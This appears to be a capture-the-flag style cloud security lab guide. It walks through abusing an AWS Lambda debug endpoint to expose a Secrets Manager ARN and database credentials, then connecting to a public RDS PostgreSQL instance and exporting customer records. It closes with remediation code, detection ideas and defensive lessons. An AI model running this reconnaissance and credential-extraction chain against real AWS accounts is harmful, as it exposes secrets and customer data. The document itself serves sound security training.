# Lambda Function Secrets Exposure

**Difficulty:** 3  
**Estimated Time:** 30-45 minutes  
**Prerequisites:** AWS CLI, curl, PostgreSQL client (psql)

## Scenario

A development team deployed a serverless API using Lambda and API Gateway. The application connects to an RDS database using credentials stored in AWS Secrets Manager. To facilitate debugging during development, they enabled verbose logging and debug mode.

Your objective is to enumerate the API, identify exposed configuration details, retrieve database credentials from Secrets Manager, and access the production database containing sensitive customer records.

## Learning Objectives

- Enumerate API Gateway endpoints and Lambda functions
- Identify information disclosure through debug modes and verbose logging
- Extract AWS resource ARNs from exposed configuration
- Use Lambda IAM roles to access Secrets Manager
- Retrieve and use database credentials from Secrets Manager
- Connect to RDS instances and extract data
- Understand serverless security boundaries

## Architecture

- API Gateway HTTP API with public endpoints
- Lambda function with debug mode enabled exposing environment variables
- IAM role granting Lambda access to Secrets Manager
- Secrets Manager storing RDS credentials
- PostgreSQL RDS instance with customer data
- Publicly accessible database (misconfigured security group)

## Attack Chain

1. **API Enumeration** → Discover available endpoints
2. **Configuration Exposure** → Extract environment variables from debug mode
3. **Secrets Manager ARN** → Identify secret location from Lambda config
4. **Credential Retrieval** → Use exposed information to access Secrets Manager
5. **Database Access** → Connect to RDS using recovered credentials
6. **Data Exfiltration** → Query customer_records table for flag

## Initial Setup

Deploy the lab:

```bash
vault deploy aws/lambda-secrets-exposure
vault outputs aws/lambda-secrets-exposure
```

Note the API endpoint URL for enumeration.

## Phase 1: API Enumeration

Test available endpoints:

```bash
API_ENDPOINT="<api_endpoint_from_outputs>"

# Test health check
curl "${API_ENDPOINT}/health"

# Test status endpoint
curl "${API_ENDPOINT}/status"

# Try additional paths
curl "${API_ENDPOINT}/db-test"
curl "${API_ENDPOINT}/config"
curl "${API_ENDPOINT}/debug"
```

Examine responses for exposed configuration data. Debug modes often reveal internal implementation details.

## Phase 2: Configuration Analysis

The `/status` endpoint with debug mode enabled exposes:
- Lambda function metadata
- Environment variable names and values
- AWS resource ARNs
- Internal API endpoints

Extract critical information:
- `SECRET_ARN` - Secrets Manager secret location
- `DB_HOST` - Database endpoint
- `DB_NAME` - Database name
- `API_KEY` - Application API key

## Phase 3: Secrets Manager Access

Attempt to retrieve the secret directly using AWS CLI:

```bash
SECRET_ARN="<secret_arn_from_debug_output>"

# Try to get secret value
aws secretsmanager get-secret-value --secret-id "${SECRET_ARN}"
```

**Note:** This will fail if you don't have IAM permissions. However, the Lambda function itself has access.

Check if there's a Lambda endpoint that retrieves the secret:

```bash
curl "${API_ENDPOINT}/db-test"
```

This endpoint uses the Lambda's IAM role to fetch credentials and may expose them in the response.

## Phase 4: Database Connection

Using credentials obtained from Secrets Manager or the Lambda response:

```bash
DB_HOST="<from_secrets_or_output>"
DB_USER="admin"
DB_PASS="<password_from_secret>"
DB_NAME="production"

# Connect to PostgreSQL
psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}"
# Enter password when prompted
```

Alternative using environment variable:

```bash
export PGPASSWORD="<password>"
psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}"
```

## Phase 5: Data Enumeration

Once connected to the database:

```sql
-- List all tables
\dt

-- Describe customer_records table
\d customer_records

-- Query all records
SELECT * FROM customer_records;

-- Search for flag
SELECT * FROM customer_records WHERE api_key LIKE 'FLAG%';

-- Count total records
SELECT COUNT(*) FROM customer_records;
```

## Phase 6: Data Exfiltration

Extract the flag and document findings:

```sql
-- Export specific records
\copy (SELECT * FROM customer_records WHERE api_key LIKE 'FLAG%') TO '/tmp/flag.csv' CSV HEADER;

-- Or simply view in terminal
SELECT customer_name, email, api_key FROM customer_records;
```

Exit the database:
```sql
\q
```

## Success Criteria

✓ Enumerate all API Gateway endpoints  
✓ Identify debug mode exposing environment variables  
✓ Extract Secrets Manager ARN from Lambda configuration  
✓ Retrieve database credentials from Secrets Manager  
✓ Connect to RDS PostgreSQL instance  
✓ Query customer_records table and retrieve flag

## Common Issues

**Cannot access Secrets Manager directly:**
- Correct - you don't have IAM permissions
- Use the Lambda function's `/db-test` endpoint which has IAM access
- Lambda role has `secretsmanager:GetSecretValue` permission

**Database connection refused:**
- Verify you're using the correct endpoint from outputs
- Check that the password matches exactly (no extra spaces)
- Ensure PostgreSQL client is installed: `sudo apt install postgresql-client`

**Permission denied on database:**
- Confirm you're using username "admin"
- Verify password from Secrets Manager response
- Check database name is "production"

**No flag in database:**
- Query all records: `SELECT * FROM customer_records;`
- Look in the `api_key` column
- Flag format: `FLAG{lambda_env_vars_to_secrets_manager_to_rds_*}`

## Key Vulnerabilities

**Debug Mode Enabled in Production:**
- Environment variables exposed via API
- Internal configuration revealed to attackers
- No authentication on debug endpoints

**Lambda Environment Variables:**
- Sensitive ARNs and endpoints stored in plaintext
- Accessible through function configuration
- Debug logging exposes all variables

**Overly Permissive IAM:**
- Lambda has Secrets Manager access
- No resource-based policies restricting access
- Function can be invoked publicly

**Public Database Access:**
- RDS security group allows 0.0.0.0/0
- No VPC endpoint enforcement
- Direct internet connectivity

## Remediation

**Lambda Function Security:**
```python
# Remove debug mode in production
DEBUG_MODE = os.environ.get('DEBUG_MODE', 'false')
if DEBUG_MODE == 'true' and os.environ.get('STAGE') == 'prod':
    raise ValueError("Debug mode not allowed in production")

# Never expose full configuration
# Return only necessary status information
```

**Secrets Management:**
```hcl
# Use Secrets Manager, but don't expose ARN
# Reference secrets by name with restricted IAM
resource "aws_lambda_function" "secure" {
  environment {
    variables = {
      SECRET_NAME = "db-credentials"  # Name only, not ARN
      # Don't include DB_HOST, API_KEY, etc.
    }
  }
}
```

**API Gateway Security:**
```hcl
# Implement API Gateway authorization
resource "aws_apigatewayv2_authorizer" "auth" {
  api_id           = aws_apigatewayv2_api.api.id
  authorizer_type  = "JWT"
  identity_sources = ["$request.header.Authorization"]
  # Configure JWT issuer and audience
}

# Apply to routes
resource "aws_apigatewayv2_route" "secure" {
  authorization_type = "JWT"
  authorizer_id      = aws_apigatewayv2_authorizer.auth.id
}
```

**Database Security:**
```hcl
resource "aws_db_instance" "secure" {
  publicly_accessible = false  # Never expose RDS publicly
  
  vpc_security_group_ids = [
    aws_security_group.db_private.id
  ]
}

resource "aws_security_group" "db_private" {
  ingress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.lambda.id]  # Only from Lambda
  }
}
```

**IAM Least Privilege:**
```json
{
  "Effect": "Allow",
  "Action": "secretsmanager:GetSecretValue",
  "Resource": "arn:aws:secretsmanager:region:account:secret:specific-secret",
  "Condition": {
    "StringEquals": {
      "aws:RequestedRegion": "us-gov-east-1"
    }
  }
}
```

## Detection Opportunities

**CloudTrail Events:**
- `secretsmanager:GetSecretValue` - Unusual source IP or frequency
- `rds:DescribeDBInstances` - Enumeration activity
- `lambda:GetFunction` - Configuration reconnaissance
- `apigateway:GET` - High volume requests to debug endpoints

**VPC Flow Logs:**
- Connections to RDS from unexpected IPs
- High volume traffic to database port 5432
- Connections from outside VPC to private resources

**RDS Performance Insights:**
- Unusual query patterns
- SELECT * queries on all tables
- Connections from unexpected IP addresses
- Off-hours database access

**Lambda CloudWatch Logs:**
- Increased invocation rate
- Error patterns indicating probing
- Access to `/db-test` endpoint from unknown sources

## Defense in Depth

1. **Application Layer:** Remove debug modes, sanitize responses
2. **API Gateway:** Implement authentication and rate limiting
3. **Lambda:** Principle of least privilege IAM roles
4. **Secrets Manager:** Resource-based policies and VPC endpoints
5. **RDS:** Private subnets only, restrictive security groups
6. **Network:** VPC endpoints for AWS services, no public internet
7. **Monitoring:** CloudTrail, GuardDuty, Security Hub alerts

## Learning Outcomes

**Technical Skills:**
- API Gateway enumeration techniques
- Lambda function reconnaissance
- Secrets Manager credential extraction
- PostgreSQL database access and querying
- AWS IAM role exploitation

**Cloud Security Concepts:**
- Serverless security boundaries
- Secrets management best practices
- Defense in depth for serverless
- IAM role vs user permissions
- Public vs private resource access

**Defensive Lessons:**
- Debug modes must never reach production
- Environment variables require careful management
- API authentication is mandatory
- Database isolation is critical
- Comprehensive logging enables detection

## Additional Challenges

**Post-Exploitation:**
- Can you identify other secrets in Secrets Manager?
- What other tables exist in the database?
- Can you modify customer records?
- What CloudTrail events did your attack generate?

**Hardening Exercise:**
- How would you secure this architecture?
- What monitoring would detect this attack?
- Where should network boundaries be?
- What IAM policies would prevent this?

## Cleanup

```bash
vault destroy aws/lambda-secrets-exposure
```

This removes all resources including Lambda, API Gateway, Secrets Manager secret, and RDS instance.